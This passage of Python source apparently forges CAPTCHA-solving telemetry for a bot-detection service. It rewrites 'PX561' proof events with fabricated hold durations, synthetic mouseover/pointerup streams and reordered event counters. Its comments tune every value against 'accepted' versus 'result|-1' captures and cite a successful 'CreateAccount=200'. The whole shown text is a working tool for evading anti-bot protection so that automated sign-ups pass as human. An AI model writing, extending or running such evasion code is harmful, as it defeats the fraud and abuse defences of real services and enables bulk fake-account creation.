    The old 1s success used the synthetic-U0 HU sequence 2/4/6/7 and a much
    shorter logical envelope than the later ADS-long cluster:

      e≈2528, z≈9345, wi≈11873, ui≈11910, r3≈13391, bzt≈2709, dz_len=5.

    Keep current-run coordinates where possible, but put the decisive elapsed
    fields and sampled streams back into that compact old-1s shape.
    """
    if not isinstance(d, dict):
        return False
    seed = f"{d.get('QS07ZwRKPlU=', qs)}:{d.get('PARNQnlrTHQ=')}:{d.get('WiZrIB9LbBU=')}"

    e = 2460 + _stable_int(seed, "old1s-e", mod=141)                 # 2460..2600
    duration = 9180 + _stable_int(seed, "old1s-z", mod=281)          # 9180..9460
    wi = e + duration + (_stable_int(seed, "old1s-wi", mod=25) - 12)
    ui = wi + 30 + _stable_int(seed, "old1s-ui", mod=16)             # +30..45
    r3 = ui + 1380 + _stable_int(seed, "old1s-r3", mod=181)          # +1380..1560
    xq = ui + 5

    before = {
        "e": d.get("eEgJDj4mCD4="),
        "z": d.get("ZjoXPCNQGQw="),
        "wi": d.get("WiZrIB9LbBU="),
        "ui": d.get("Ui5jKBREZxs="),
        "r3": d.get("R3c9PQEXNg8="),
        "s3": d.get("S3sxMQ0YNQo="),
        "bzt": d.get("Bzt2fUFRcw=="),
        "xq": d.get("XQUsAxhpKjU="),
        "dz_len": len(d.get("DzN+dUlTekE=") or []) if isinstance(d.get("DzN+dUlTekE="), list) else None,
    }

    d["eEgJDj4mCD4="] = int(e)
    d["ZjoXPCNQGQw="] = [int(duration)]
    d["WiZrIB9LbBU="] = int(wi)
    d["Ui5jKBREZxs="] = int(ui)
    d["R3c9PQEXNg8="] = int(r3)
    if "XQUsAxhpKjU=" in d:
        d["XQUsAxhpKjU="] = int(xq)
    if "S3sxMQ0YNQo=" in d:
        d["S3sxMQ0YNQo="] = int(wi + 320 + _stable_int(seed, "old1s-s3", mod=71))
    if "Bzt2fUFRcw==" in d:
        d["Bzt2fUFRcw=="] = 2620 + _stable_int(seed, "old1s-bzt", mod=181)
    if "QABxRgZqcXQ=" in d:
        d["QABxRgZqcXQ="] = 5350 + _stable_int(seed, "old1s-qab", mod=351)
    if "KVkYX28zG2o=" in d:
        d["KVkYX28zG2o="] = 4680 + _stable_int(seed, "old1s-kv28", mod=351)
    if "STk4fwxXPE4=" in d:
        d["STk4fwxXPE4="] = 630 + _stable_int(seed, "old1s-stk", mod=41)
    if isinstance(d.get("GCgpLl1AKRw="), list):
        d["GCgpLl1AKRw="] = ["#px-captcha", ""]

    base_qs = qs
    try:
        base_qs = int(float(d.get("QS07ZwRKPlU=", qs)))
    except Exception:
        try:
            base_qs = int(float(qs))
        except Exception:
            base_qs = None
    if base_qs is not None:
        p_arn = int(base_qs - xq - 1)
        d["PARNQnlrTHQ="] = p_arn
        d["KVkYX2w2GWg="] = [p_arn + int(e) + 18 + _stable_int(seed, "old1s-kv2", mod=9)]

    dz = d.get("DzN+dUlTekE=")
    if isinstance(dz, list) and dz:
        mouse_src = next((x for x in dz if isinstance(x, dict) and x.get("PX12343") in ("mouseover", "mousemove")), {})
        pointer_src = next((x for x in reversed(dz) if isinstance(x, dict) and x.get("PX12343") in ("pointerup", "mouseup")), mouse_src)

        def make(src, typ, cnt, t):
            item = dict(src) if isinstance(src, dict) else {}
            item["PX12343"] = typ
            item["PX11652"] = cnt
            item["PX11699"] = int(round(t))
            item.setdefault("PX12270", "true")
            return item

        t1 = 1320 + _stable_int(seed, "old1s-dz1", mod=130)
        t0 = 2920 + _stable_int(seed, "old1s-dz0", mod=170)
        t2 = t0 + 310 + _stable_int(seed, "old1s-dz2", mod=110)
        t3 = t2 + 18 + _stable_int(seed, "old1s-dz3", mod=25)
        d["DzN+dUlTekE="] = [
            make(mouse_src, "mouseover", 0, t0),
            make(mouse_src, "mouseover", 1, t1),
            make(mouse_src, "mouseover", 1, t2),
            make(mouse_src, "mouseover", 1, t3),
            make(pointer_src, "pointerup", 1, wi),
        ]

    gu = d.get("GUloT18mZ3U=")
    if isinstance(gu, list):
        d["GUloT18mZ3U="] = _sample_coord_series(gu, 17, 2380 + _stable_int(seed, "old1s-gu0", mod=80), duration - 520 + _stable_int(seed, "old1s-gu1", mod=120), exact=True)
    jnp = d.get("JnpXfGMUUUc=")
    if isinstance(jnp, list):
        d["JnpXfGMUUUc="] = _sample_coord_series(jnp, 33, 2380 + _stable_int(seed, "old1s-jnp0", mod=80), duration - 500 + _stable_int(seed, "old1s-jnp1", mod=140), exact=True)

    after = {
        "e": d.get("eEgJDj4mCD4="),
        "z": d.get("ZjoXPCNQGQw="),
        "wi": d.get("WiZrIB9LbBU="),
        "ui": d.get("Ui5jKBREZxs="),
        "r3": d.get("R3c9PQEXNg8="),
        "s3": d.get("S3sxMQ0YNQo="),
        "bzt": d.get("Bzt2fUFRcw=="),
        "xq": d.get("XQUsAxhpKjU="),
        "dz_len": len(d.get("DzN+dUlTekE=") or []) if isinstance(d.get("DzN+dUlTekE="), list) else None,
    }
    return before != after


def _normalize_px561_natural_long_envelope(d: dict, qs=None) -> bool:
    """Rewrite PX561 into the fresh natural-hold success cluster for this setup."""
    if not isinstance(d, dict):
        return False
    seed = f"{d.get('QS07ZwRKPlU=', qs)}:{d.get('PARNQnlrTHQ=')}:{d.get('WiZrIB9LbBU=')}"
    def _local_float(v):
        try:
            return float(v)
        except Exception:
            return None

    old_e = _local_float(d.get("eEgJDj4mCD4="))
    old_z = d.get("ZjoXPCNQGQw=")
    old_duration = _local_float(old_z[0] if isinstance(old_z, list) and old_z else None)
    old_wi = _local_float(d.get("WiZrIB9LbBU="))
    old_ui = _local_float(d.get("Ui5jKBREZxs="))
    already_signed_natural = (
        old_e is not None and 17200 <= old_e <= 18100
        and old_duration is not None and 9600 <= old_duration <= 10200
        and old_wi is not None and abs(old_wi - (old_e + old_duration)) <= 40
        and old_ui is not None and 45 <= (old_ui - old_wi) <= 95
    )
    if already_signed_natural:
        # Preserve PX1200-pre-normalized values.  Re-rolling them in the Python
        # route layer makes the visible fields diverge from the signed/opaque
        # proof emitted by hsprotect.
        e = int(round(old_e))
        duration = int(round(old_duration))
        wi = int(round(old_wi))
        ui = int(round(old_ui))
    else:
        e = 17200 + _stable_int(seed, "nat-e", mod=901)             # 17.2..18.1s
        duration = 9600 + _stable_int(seed, "nat-z", mod=601)       # 9.6..10.2s
        wi = e + duration + (_stable_int(seed, "nat-wi", mod=31) - 15)
        ui = wi + 55 + _stable_int(seed, "nat-ui", mod=31)
    r3 = ui + 1420 + _stable_int(seed, "nat-r3", mod=221)
    xq = ui + 5
    before = {
        "e": d.get("eEgJDj4mCD4="),
        "z": d.get("ZjoXPCNQGQw="),
        "wi": d.get("WiZrIB9LbBU="),
        "ui": d.get("Ui5jKBREZxs="),
        "r3": d.get("R3c9PQEXNg8="),
        "s3": d.get("S3sxMQ0YNQo="),
        "bzt": d.get("Bzt2fUFRcw=="),
    }
    d["eEgJDj4mCD4="] = int(e)
    d["ZjoXPCNQGQw="] = [int(duration)]
    d["WiZrIB9LbBU="] = int(wi)
    d["Ui5jKBREZxs="] = int(ui)
    d["R3c9PQEXNg8="] = int(r3)
    if "S3sxMQ0YNQo=" in d:
        d["S3sxMQ0YNQo="] = int(wi + 330 + _stable_int(seed, "nat-s3", mod=161))
    if "Bzt2fUFRcw==" in d:
        d["Bzt2fUFRcw=="] = 5650 + (_stable_int(seed, "nat-bzt", mod=3001) / 10.0)
    if "XQUsAxhpKjU=" in d:
        d["XQUsAxhpKjU="] = int(xq)
    if "QABxRgZqcXQ=" in d:
        d["QABxRgZqcXQ="] = 5400 + _stable_int(seed, "nat-qab", mod=1201)
    if "KVkYX28zG2o=" in d:
        d["KVkYX28zG2o="] = 3300 + _stable_int(seed, "nat-kv28", mod=1001)
    if isinstance(d.get("GCgpLl1AKRw="), list):
        d["GCgpLl1AKRw="] = ["#px-captcha", "BODY", ""]
    base_qs = qs
    try:
        base_qs = int(float(d.get("QS07ZwRKPlU=", qs)))
    except Exception:
        try:
            base_qs = int(float(qs))
        except Exception:
            base_qs = None
    if base_qs is not None:
        p_arn = int(base_qs - xq - 2)
        d["PARNQnlrTHQ="] = p_arn
        d["KVkYX2w2GWg="] = [p_arn + int(e) + 10 + _stable_int(seed, "nat-kv2", mod=18)]

    dz = d.get("DzN+dUlTekE=")
    if isinstance(dz, list) and dz:
        mouse_src = next((x for x in dz if isinstance(x, dict) and x.get("PX12343") in ("mouseover", "mousemove")), {})
        out_src = next((x for x in dz if isinstance(x, dict) and x.get("PX12343") == "mouseout"), mouse_src)
        pointer_src = next((x for x in reversed(dz) if isinstance(x, dict) and x.get("PX12343") in ("pointerup", "mouseup")), mouse_src)

        def make(src, typ, cnt, t):
            item = dict(src) if isinstance(src, dict) else {}
            item["PX12343"] = typ
            item["PX11652"] = cnt
            item["PX11699"] = int(round(t))
            item.setdefault("PX12270", "true")
            return item

        a = e - (5550 + _stable_int(seed, "nat-a", mod=350))
        b = e - (4200 + _stable_int(seed, "nat-b", mod=260))
        c = e - (3050 + _stable_int(seed, "nat-c", mod=260))
        d2 = e - (4500 + _stable_int(seed, "nat-d", mod=300))
        edge1 = wi - (6000 + _stable_int(seed, "nat-edge1", mod=220))
        edge2 = edge1 + 10 + _stable_int(seed, "nat-edge2", mod=35)
        burst = [d2 + _stable_int(seed, f"nat-burst-{i}", mod=360) for i in range(9)]
        burst.sort()
        d["DzN+dUlTekE="] = [
            make(mouse_src, "mouseover", 0, a),
            make(out_src, "mouseout", 0, b),
            make(mouse_src, "mouseover", 1, b),
            make(out_src, "mouseout", 1, b + 25),
            make(mouse_src, "mouseover", 0, b + 25),
            make(out_src, "mouseout", 0, b + 30),
            make(mouse_src, "mouseover", 1, b + 30),
            make(out_src, "mouseout", 1, c),
            make(mouse_src, "mouseover", 0, c),
        ] + [make(mouse_src, "mouseover", 2, t) for t in burst] + [
            make(out_src, "mouseout", 2, edge1),
            make(mouse_src, "mouseover", 2, edge1),
            make(out_src, "mouseout", 2, edge2),
            make(mouse_src, "mouseover", 2, edge2),
            make(pointer_src, "pointerup", 2, wi),
        ]

    gu = d.get("GUloT18mZ3U=")
    if isinstance(gu, list):
        d["GUloT18mZ3U="] = _sample_coord_series(gu, 150, e - 15500, e - 11750, exact=True)
    jnp = d.get("JnpXfGMUUUc=")
    if isinstance(jnp, list):
        d["JnpXfGMUUUc="] = _sample_coord_series(jnp, 600, e - 15500, r3 - 650, exact=True)
    after = {
        "e": d.get("eEgJDj4mCD4="),
        "z": d.get("ZjoXPCNQGQw="),
        "wi": d.get("WiZrIB9LbBU="),
        "ui": d.get("Ui5jKBREZxs="),
        "r3": d.get("R3c9PQEXNg8="),
        "s3": d.get("S3sxMQ0YNQo="),
        "bzt": d.get("Bzt2fUFRcw=="),
    }
    return before != after


def _normalize_px561_dz_minimal(d: dict) -> bool:
    """Keep the live proof envelope, but remove retry/click noise.

    The post-upgrade failures often contain a dirty first attempt in the same
    PX561 packet: pointerdown/mousedown/up/click for the visible-iframe
    fallback, followed by the real hold.  Known accepted captures have a much
    narrower shape: mouseover/out telemetry plus a final pointerup, no click,
    and PX11652 never above 1.  This normalizer preserves the current run's
    coordinates and high-level timings instead of transplanting a static proof
    template.
    """
    changed = False
    dz = d.get("DzN+dUlTekE=")
    if not isinstance(dz, list) or not dz:
        return False

    def _cnt(item):
        try:
            return int(item.get("PX11652", 0))
        except Exception:
            return 0

    def _etype(item):
        return str(item.get("PX12343") or "")

    noisy_types = {"pointerdown", "mousedown", "mouseup", "click"}
    clean = [dict(item) for item in dz if isinstance(item, dict) and _etype(item) not in noisy_types]
    if len(clean) != len(dz):
        changed = True

    counts = [_cnt(item) for item in clean]
    max_count = max(counts) if counts else 0
    selected = clean
    if max_count > 1:
        active = [item for item in clean if _cnt(item) == max_count]
        # Only collapse to the active group when it contains the release event;
        # otherwise keep the full clean stream and just clamp counts.
        if any(_etype(item) == "pointerup" for item in active):
            selected = active
            changed = True

    if selected:
        mapped = []
        for idx, item in enumerate(selected):
            item = dict(item)
            new_count = 0 if idx == 0 else min(1, _cnt(item))
            if item.get("PX11652") != new_count:
                item["PX11652"] = new_count
                changed = True
            mapped.append(item)
        selected = mapped

    wi = d.get("WiZrIB9LbBU=")
    try:
        wi_int = int(float(wi))
    except Exception:
        wi_int = None
    if selected:
        last = selected[-1]
        if _etype(last) != "pointerup":
            selected.append({
                "PX12343": "pointerup",
                "PX11652": 1,
                "PX11699": wi_int if wi_int is not None else last.get("PX11699"),
                "PX12270": "true",
            })
            changed = True
        elif wi_int is not None and last.get("PX11699") != wi_int:
            last["PX11699"] = wi_int
            changed = True

    if selected != dz:
        d["DzN+dUlTekE="] = selected
        changed = True

    # Long windmouse traces are not inherently bad, but the 150/600 point
    # post-fallback streams make the packet look like multiple attempts.  Keep
    # a deterministic, current-coordinate sample instead of a static template.
    for key, limit in (("GUloT18mZ3U=", 28), ("JnpXfGMUUUc=", 56)):
        value = d.get(key)
        if isinstance(value, list) and len(value) > limit:
            d[key] = _sample_px_series(value, limit)
            changed = True
    return changed


def _normalize_final_aux_r3(events: list, qs=None) -> bool:
    """Keep final aRV/Knp elapsed times in the accepted early-audit window.

    The short no-U0 PX561 envelope can look correct while the companion
    aRV/Knp audit events still carry the long wall-clock wait from the current
    run.  The accepted samples have aRV/Knp near the early challenge audit
    window (roughly aRV 1.6-3.9s, Knp 3.8-4.5s) and PX/JDBe much later.  This
    route-level fix only adjusts those two R3 fields; PX/JDBe timing remains
    controlled by the PX561 normalizer.
    """
    if not isinstance(events, list):
        return False
    tags = [ev.get("t") for ev in events if isinstance(ev, dict)]
    if "PX561" not in tags or "KnpQcG8ZVUI=" not in tags or "aRVTHy91Wio=" not in tags:
        return False
    try:
        seed = f"{qs}:{tags}:{len(events)}"
    except Exception:
        seed = str(tags)
    target_arv = 3200 + _stable_int(seed, "arv-r3", mod=801)   # 3200..4000
    target_knp = target_arv + 430 + _stable_int(seed, "knp-r3", mod=331)  # +430..760
    changed = False
    for ev in events:
        if not isinstance(ev, dict) or not isinstance(ev.get("d"), dict):
            continue
        d = ev["d"]
        if ev.get("t") == "aRVTHy91Wio=":
            try:
                old = float(d.get("R3c9PQEXNg8=", 0))
            except Exception:
                old = 0.0
            if old > 5000 or old < 900:
                d["R3c9PQEXNg8="] = target_arv
                changed = True
        elif ev.get("t") == "KnpQcG8ZVUI=":
            try:
                old = float(d.get("R3c9PQEXNg8=", 0))
            except Exception:
                old = 0.0
            if old > 5600 or old < 1200:
                d["R3c9PQEXNg8="] = target_knp
                changed = True
    return changed


def _normalize_final_proof_events(events: list, mode: str = "minimal", preserve_bfa: bool = False) -> tuple[bool, dict]:
    mode = (mode or "minimal").strip().lower()
    if mode in ("off", "none", "false", "0"):
        return False, {}
    tags = [ev.get("t") for ev in (events or []) if isinstance(ev, dict)]
    if "PX561" not in tags:
        return False, {}

    before = {"tags": tags[:], "px": {}}
    changed = False

    if not preserve_bfa and mode not in ("ads_safe",):
        filtered_events = [ev for ev in events if not (isinstance(ev, dict) and ev.get("t") == "BFA+GkExMiE=")]
        if len(filtered_events) != len(events):
            events[:] = filtered_events
            changed = True

    changed = _clean_probe_globals_from_events(events) or changed

    qs = None
    for ev in events:
        d = ev.get("d") if isinstance(ev, dict) else None
        if isinstance(d, dict) and d.get("QS07ZwRKPlU=") is not None:
            try:
                qs = int(float(d.get("QS07ZwRKPlU=")))
                break
            except Exception:
                pass

    ads_safe_target_xghm = None
    if mode == "ads_safe":
        # 20260705 ADS-like 1s samples split on a narrow geometry band:
        # accepted/result0 packets stayed around XGhm≈78..140, while otherwise
        # well-shaped result|-1 packets landed at XGhm≈148..150 and, on the
        # AyuCloud HK06 sample, at XGhm≈252.  Treat high-XGhm compact finals as
        # the same geometry outlier and clamp all final-event envelopes together.
        # Only clamp the current compact ADS cluster, and keep the value stable
        # across all final events so envelopes remain internally consistent.
        try:
            for ev in events:
                d = ev.get("d") if isinstance(ev, dict) else None
                if ev.get("t") != "PX561" or not isinstance(d, dict):
                    continue
                e_now = float(d.get("eEgJDj4mCD4="))
                z_value = d.get("ZjoXPCNQGQw=")
                dur_now = float(z_value[0] if isinstance(z_value, list) and z_value else z_value)
                xghm_now = float(d.get("XGhmYhkIbVU="))
                if 2800 <= e_now <= 3400 and 12500 <= dur_now <= 13350 and 145 <= xghm_now <= 285:
                    seed = f"{qs}:{d.get('PARNQnlrTHQ=')}:{d.get('WiZrIB9LbBU=')}:ads_safe_xghm"
                    try:
                        px_hu_now = int(float(d.get("HUlnQ1slanM=")))
                    except Exception:
                        px_hu_now = 0
                    if px_hu_now <= 5:
                        # Normal no-U0 tail-BFA accepted cluster:
                        # PX/JD/BFA HU 5/6/7 and XGhm≈78..90.  Clamping this
                        # shape to the shifted 140-ish cluster produced a
                        # collector result|-1 on 20260705_052021.
                        ads_safe_target_xghm = round(84.2 + (_stable_int(seed, "xghm-tail", mod=61) / 10.0), 1)
                    else:
                        # Shifted/natural-U0 cluster, matching the 1.3s
                        # CreateAccount=200 sample with PX/JD HU 6/7.
                        ads_safe_target_xghm = round(138.4 + (_stable_int(seed, "xghm-shifted", mod=31) / 10.0), 1)
                break
        except Exception:
            ads_safe_target_xghm = None

    if mode == "ads_safe":
        # Natural-U0 accelerated finals can arrive as:
        #   aRV(2), Knp(3), PX(6), JDBe(7), BFA(8)
        # The only 1.3s CreateAccount=200 trace with that shifted PX/JDBe
        # counter shape instead carried the BFA as an early/middle proof:
        #   aRV(2), Knp(3), BFA(4), PX(6), JDBe(7)
        # Keep the no-U0 tail-BFA cluster (PX=5, JDBe=6, BFA=7) intact, but
        # repair the shifted/natural-U0 cluster by moving BFA before PX and
        # giving it the middle counter.  This is deliberately narrow: it only
        # fires when PX/JDBe are shifted by one beyond the normal tail pattern.
        try:
            by_tag = {
                ev.get("t"): ev
                for ev in events
                if isinstance(ev, dict) and isinstance(ev.get("d"), dict)
            }

            def _hu(tag):
                try:
                    return int(float((by_tag.get(tag) or {}).get("d", {}).get("HUlnQ1slanM=")))
                except Exception:
                    return None

            a_hu = _hu("aRVTHy91Wio=")
            k_hu = _hu("KnpQcG8ZVUI=")
            px_hu = _hu("PX561")
            jd_hu = _hu("JDBeOmJSWwo=")
            bfa_hu = _hu("BFA+GkExMiE=")
            if all(v is not None for v in (a_hu, k_hu, px_hu, jd_hu, bfa_hu)):
                # 20260705_234720 showed a distinct result|-1 shape:
                #   aRV(2), Knp(4), PX(6), JDBe(7), BFA(8)
                # The accepted shifted/natural-U0 sample nearby is:
                #   aRV(2), Knp(3), BFA(4), PX(6), JDBe(7)
                # i.e. the separately-emitted U0 appears to have shifted only
                # Knp/BFA in the final envelope.  Repair just this narrow
                # pattern before the generic shifted_px_jd branch below.
                stray_u0_shifted_knp = (
                    k_hu == a_hu + 2
                    and px_hu == a_hu + 4
                    and jd_hu == px_hu + 1
                    and bfa_hu >= jd_hu + 1
                )
                if stray_u0_shifted_knp:
                    knp_ev = by_tag.get("KnpQcG8ZVUI=")
                    bfa_ev = by_tag.get("BFA+GkExMiE=")
                    if knp_ev and isinstance(knp_ev.get("d"), dict):
                        target_knp_hu = a_hu + 1
                        if knp_ev["d"].get("HUlnQ1slanM=") != target_knp_hu:
                            knp_ev["d"]["HUlnQ1slanM="] = target_knp_hu
                            changed = True
                    if bfa_ev and isinstance(bfa_ev.get("d"), dict):
                        target_bfa_hu = a_hu + 2
                        if bfa_ev["d"].get("HUlnQ1slanM=") != target_bfa_hu:
                            bfa_ev["d"]["HUlnQ1slanM="] = target_bfa_hu
                            changed = True
                        rest = [ev for ev in events if not (isinstance(ev, dict) and ev.get("t") == "BFA+GkExMiE=")]
                        px_idx = next((idx for idx, ev in enumerate(rest) if isinstance(ev, dict) and ev.get("t") == "PX561"), None)
                        if px_idx is not None:
                            rest.insert(px_idx, bfa_ev)
                            if [ev.get("t") for ev in rest if isinstance(ev, dict)] != [ev.get("t") for ev in events if isinstance(ev, dict)]:
                                events[:] = rest
                                tags[:] = [ev.get("t") for ev in events if isinstance(ev, dict)]
                                changed = True
                    # Re-read after the repair so the generic branch below
                    # does not move BFA a second time based on stale counters.
                    a_hu = _hu("aRVTHy91Wio=")
                    k_hu = _hu("KnpQcG8ZVUI=")
                    px_hu = _hu("PX561")
                    jd_hu = _hu("JDBeOmJSWwo=")
                    bfa_hu = _hu("BFA+GkExMiE=")
                base_hu = max(a_hu, k_hu)
                shifted_px_jd = px_hu == base_hu + 3 and jd_hu == px_hu + 1
                tail_or_late_bfa = bfa_hu >= jd_hu or tags.index("BFA+GkExMiE=") > tags.index("PX561")
                if shifted_px_jd and tail_or_late_bfa:
                    bfa_ev = by_tag.get("BFA+GkExMiE=")
                    if bfa_ev and isinstance(bfa_ev.get("d"), dict):
                        target_bfa_hu = base_hu + 1
                        if bfa_ev["d"].get("HUlnQ1slanM=") != target_bfa_hu:
                            bfa_ev["d"]["HUlnQ1slanM="] = target_bfa_hu
                            changed = True
                        # Preserve one BFA and place it immediately before PX.
                        rest = [ev for ev in events if not (isinstance(ev, dict) and ev.get("t") == "BFA+GkExMiE=")]
                        px_idx = next((idx for idx, ev in enumerate(rest) if isinstance(ev, dict) and ev.get("t") == "PX561"), None)
                        if px_idx is not None:
                            rest.insert(px_idx, bfa_ev)
                            if [ev.get("t") for ev in rest if isinstance(ev, dict)] != [ev.get("t") for ev in events if isinstance(ev, dict)]:
                                events[:] = rest
                                changed = True
        except Exception:
            pass

    for ev in events:
        if not isinstance(ev, dict):
            continue
        d = ev.get("d")
        if not isinstance(d, dict):
            continue
        if ev.get("t") == "PX561":
            before["px"] = {
                "e": d.get("eEgJDj4mCD4="),
                "z": d.get("ZjoXPCNQGQw="),
                "wi": d.get("WiZrIB9LbBU="),
                "ui": d.get("Ui5jKBREZxs="),
                "r3": d.get("R3c9PQEXNg8="),
                "dz_len": len(d.get("DzN+dUlTekE=") or []),
                "click": any(isinstance(x, dict) and x.get("PX12343") == "click" for x in (d.get("DzN+dUlTekE=") or [])),
            }
            if mode == "natural_long":
                changed = _normalize_px561_natural_long_envelope(d, qs=qs) or changed
            elif mode == "ads_safe":
                changed = _normalize_px561_ads_safe_envelope(d, qs=qs) or changed
                try:
                    ui_now = float(d.get("Ui5jKBREZxs="))
                    r3_now = float(d.get("R3c9PQEXNg8="))
                    # Current ADS-like accepted finals cluster at PX.R3-UI
                    # about 1.36-1.48s.  Low-tail packets around 1.25-1.34s
                    # repeatedly return result|-1 even with good e/z/BFA.
                    if 900 <= (r3_now - ui_now) < 1350:
                        seed = f"{qs}:{d.get('PARNQnlrTHQ=')}:{d.get('WiZrIB9LbBU=')}:ads_safe_r3tail"
                        d["R3c9PQEXNg8="] = int(round(ui_now + 1410 + _stable_int(seed, "r3tail", mod=111)))
                        changed = True
                except Exception:
                    pass
            elif mode == "ads_long":
                changed = _normalize_px561_ads_long_envelope(d, qs=qs) or changed
            elif mode == "old_1s":
                changed = _normalize_px561_old_1s_envelope(d, qs=qs) or changed
            elif mode == "template":
                template = {
                    "GCgpLl1AKRw=": ["#px-captcha", ""],
                    "eEgJDj4mCD4=": 10291,
                    "ZjoXPCNQGQw=": [3012],
                    "WiZrIB9LbBU=": 13298,
                    "Ui5jKBREZxs=": 13321,
                    "R3c9PQEXNg8=": 14838,
                    "S3sxMQ0YNQo=": 14143,
                    "Bzt2fUFRcw==": 13396,
                    "XQUsAxhpKjU=": 13844,
                    "QABxRgZqcXQ=": 270,
                    "KVkYX28zG2o=": 2729,
                    "DzN+dUlTekE=": [dict(x) for x in _PX561_DZ_TEMPLATE],
                    "GUloT18mZ3U=": list(_PX561_GU_TEMPLATE),
                    "JnpXfGMUUUc=": list(_PX561_JNP_TEMPLATE),
                }
                for key, value in template.items():
                    if d.get(key) != value:
                        d[key] = value
                        changed = True
            else:
                force_short = False
                try:
                    z_value = d.get("ZjoXPCNQGQw=")
                    duration = float(z_value[0] if isinstance(z_value, list) and z_value else 0)
                except Exception:
                    duration = 0.0
                px_hu = None
                knp_hu = None
                if duration > 7000:
                    try:
                        px_hu = int(float(d.get("HUlnQ1slanM=")))
                    except Exception:
                        px_hu = None
                    for ev2 in events:
                        d2 = ev2.get("d") if isinstance(ev2, dict) else None
                        if ev2.get("t") == "KnpQcG8ZVUI=" and isinstance(d2, dict):
                            try:
                                knp_hu = int(float(d2.get("HUlnQ1slanM=")))
                            except Exception:
                                knp_hu = None
                            break
                    # no-U0 Cloak final proofs use Knp/PX HU 3/5 in the
                    # accepted manual sample and in the current failures.  The
                    # older accelerated success with a preceding synthetic U0
                    # uses Knp/PX HU 4/6 and should keep its long-z shape.
                    force_short = (
                        knp_hu is not None
                        and px_hu is not None
                        and knp_hu <= 3
                        and px_hu <= 5
                    )
                synthetic_u0_style = (
                    knp_hu is not None
                    and px_hu is not None
                    and knp_hu >= 4
                    and px_hu >= 6
                )
                if not synthetic_u0_style:
                    changed = _normalize_px561_short_envelope(d, qs=qs, force_short=force_short) or changed
                changed = _normalize_px561_dz_minimal(d) or changed
                try:
                    ui = float(d.get("Ui5jKBREZxs="))
                    r3 = float(d.get("R3c9PQEXNg8="))
                    if r3 - ui < 900 or r3 - ui > 1800:
                        target_r3 = round(ui + 1258)
                        d["R3c9PQEXNg8="] = target_r3
                        changed = True
                except Exception:
                    pass
            if qs is not None:
                # Only normalize these derived absolute-time fields for the
                # compact manual/no-U0 style.  The older synthetic-U0 success
                # path legitimately has e≈2.5s/z≈9.2s and a different
                # QS/PARN/XQ relation; the previous unconditional template
                # formula would corrupt that accepted shape.  In compact style
                # keep the fields internally consistent with this run's XQ/e
                # rather than forcing the static manual XQ=13844 template.
                try:
                    e_now = int(round(float(d.get("eEgJDj4mCD4="))))
                except Exception:
                    e_now = None
                try:
                    z_now = d.get("ZjoXPCNQGQw=")
                    dur_now = float(z_now[0] if isinstance(z_now, list) and z_now else 0)
                except Exception:
                    dur_now = 0.0
                dz_now = d.get("DzN+dUlTekE=")
                short_manual_style = (
                    e_now is not None
                    and e_now >= 8500
                    and dur_now <= 5000
                    and isinstance(dz_now, list)
                    and len(dz_now) <= 8
                )
                if short_manual_style:
                    try:
                        xq_now = int(round(float(d.get("XQUsAxhpKjU="))))
                    except Exception:
                        xq_now = 13844
                    p_arn = int(qs - xq_now - 3)
                    kv = [p_arn + int(e_now) + 18]
                    if d.get("PARNQnlrTHQ=") != p_arn:
                        d["PARNQnlrTHQ="] = p_arn
                        changed = True
                    if d.get("KVkYX2w2GWg=") != kv:
                        d["KVkYX2w2GWg="] = kv
                        changed = True

        elif ev.get("t") == "JDBeOmJSWwo=":
            if mode == "template":
                jd_template = {
                    "R3c9PQEXNg8=": 14838,
                    "XGhmYhkIbVU=": 279.09999999403954,
                    "S3sxMQ0YNQo=": 14144,
                    "STk4fwxXPE4=": 388,
                }
                for key, value in jd_template.items():
                    if key in d and d.get(key) != value:
                        d[key] = value
                        changed = True
        elif ev.get("t") == "BFA+GkExMiE=" and mode == "ads_safe":
            # Accepted ADS-like accelerated samples usually keep the BFA
            # selector map scoped to BODY only.  Some retry/rechallenge samples
            # carry an extra "#px-captcha" entry in EFwqFlU4ISQ= even when the
            # PX561 shape is otherwise accepted (collector result0 but host
            # risk/verify re-issues HumanCaptcha).  Trim only this selector map;
            # leave BFA movement/timing streams intact because they are strongly
            # session-bound and broad rewrites previously reduced acceptance.
            ef = d.get("EFwqFlU4ISQ=")
            if isinstance(ef, dict) and "BODY" in ef and set(ef.keys()) != {"BODY"}:
                d["EFwqFlU4ISQ="] = {"BODY": ef.get("BODY")}
                changed = True
            elif isinstance(ef, dict) and "BODY" not in ef and "#px-captcha" in ef:
                d["EFwqFlU4ISQ="] = {"BODY": ef.get("#px-captcha")}
                changed = True
            cx = d.get("CXVzP0wQeg0=")
            if isinstance(cx, list) and len(cx) > 7:
                move = next((dict(x) for x in cx if isinstance(x, dict) and x.get("PX12343") == "mousemove"), None)
                out = next((dict(x) for x in cx if isinstance(x, dict) and x.get("PX12343") == "mouseout" and x.get("PX12165") == "body"), None)
                if out is None:
                    out = next((dict(x) for x in cx if isinstance(x, dict) and x.get("PX12343") == "mouseout"), None)
                compact = [x for x in (move, out) if isinstance(x, dict)]
                if len(compact) >= 2:
                    compact[1]["PX11652"] = 2
                    d["CXVzP0wQeg0="] = compact
                    changed = True

    if ads_safe_target_xghm is not None:
        for ev in events:
            if not isinstance(ev, dict) or ev.get("t") not in ("aRVTHy91Wio=", "KnpQcG8ZVUI=", "PX561", "JDBeOmJSWwo=", "BFA+GkExMiE="):
                continue
            d = ev.get("d")
            if isinstance(d, dict) and "XGhmYhkIbVU=" in d and d.get("XGhmYhkIbVU=") != ads_safe_target_xghm:
                d["XGhmYhkIbVU="] = ads_safe_target_xghm
                changed = True

    if mode in ("ads_long", "natural_long", "old_1s"):
        try:
            seed = f"{qs}:{tags}:{len(events)}"
        except Exception:
            seed = str(tags)
        if mode == "natural_long":
            target_arv = 2150 + _stable_int(seed, "nat-arv-r3", mod=251)
            target_knp = target_arv + 430 + _stable_int(seed, "nat-knp-r3", mod=181)
            target_xghm = 108.8 + (_stable_int(seed, "nat-xghm", mod=61) / 10.0)
        elif mode == "old_1s":
            target_arv = 2320 + _stable_int(seed, "old1s-arv-r3", mod=181)
            target_knp = target_arv + 610 + _stable_int(seed, "old1s-knp-r3", mod=111)
            target_xghm = 129.6 + (_stable_int(seed, "old1s-xghm", mod=81) / 10.0)
        else:
            target_arv = 1550 + _stable_int(seed, "ads-arv-r3", mod=251)   # 1550..1800
            target_knp = target_arv + 370 + _stable_int(seed, "ads-knp-r3", mod=121)
            target_xghm = None
        for ev in events:
            if not isinstance(ev, dict) or not isinstance(ev.get("d"), dict):
                continue
            d = ev["d"]
